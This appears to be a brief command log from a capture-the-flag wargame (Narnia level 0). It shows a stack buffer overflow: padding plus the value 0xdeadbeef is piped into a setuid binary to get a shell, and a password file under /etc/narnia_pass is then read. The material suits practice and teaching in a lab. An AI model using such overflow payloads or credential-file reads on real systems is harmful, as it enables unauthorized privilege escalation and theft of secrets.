# narnia 0 -> narnia 1
file narnia0
file narnia0.c
vim narnia0.c
mkdir /tmp/zulu
cd /tmp/zulu
# After several tries, seems we need to use echo chained with cat to pass correct val in hex dump transl. to narnia0 executable to 1. open shell with narnia1 perm and 2. keep shel open
( echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat; ) | /narnia/narnia0
whoami
cat /etc/narnia_pass/narnia0



